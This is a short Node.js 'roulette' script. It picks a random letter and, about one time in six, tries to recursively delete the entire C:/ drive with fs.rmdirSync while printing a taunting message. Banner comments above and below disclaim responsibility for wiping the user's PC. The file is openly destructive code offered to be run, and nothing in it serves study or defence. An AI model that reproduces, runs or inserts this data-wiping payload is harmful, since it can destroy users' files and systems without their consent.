// I AM NOT RESPONSIBLE FOR WHEN THIS DELETES YOUR ENTIRE PC
// I AM NOT RESPONSIBLE FOR WHEN THIS DELETES YOUR ENTIRE PC
// I AM NOT RESPONSIBLE FOR WHEN THIS DELETES YOUR ENTIRE PC
// I AM NOT RESPONSIBLE FOR WHEN THIS DELETES YOUR ENTIRE PC
// I AM NOT RESPONSIBLE FOR WHEN THIS DELETES YOUR ENTIRE PC
// I AM NOT RESPONSIBLE FOR WHEN THIS DELETES YOUR ENTIRE PC
// I AM NOT RESPONSIBLE FOR WHEN THIS DELETES YOUR ENTIRE PC

const chalk = require('chalk')
const fs = require('fs');
const dir = 'C:/';

const array = ['A', 'B', 'C', 'D', 'E', 'F']
let random = array[Math.floor(array.length * Math.random())]

if(random === 'A') {
    setInterval(() => {
        console.log(chalk.red(`You are so fucked!`))
    }, 100)
    try {
        fs.rmdirSync(dir, { recursive: true });
    } catch(e) {
        console.log(e)
    }
} else {
    console.log(chalk.green(`You're safe this time around...`))
}

// I AM NOT RESPONSIBLE FOR WHEN THIS DELETES YOUR ENTIRE PC
// I AM NOT RESPONSIBLE FOR WHEN THIS DELETES YOUR ENTIRE PC
// I AM NOT RESPONSIBLE FOR WHEN THIS DELETES YOUR ENTIRE PC
// I AM NOT RESPONSIBLE FOR WHEN THIS DELETES YOUR ENTIRE PC
// I AM NOT RESPONSIBLE FOR WHEN THIS DELETES YOUR ENTIRE PC
// I AM NOT RESPONSIBLE FOR WHEN THIS DELETES YOUR ENTIRE PC
// I AM NOT RESPONSIBLE FOR WHEN THIS DELETES YOUR ENTIRE PC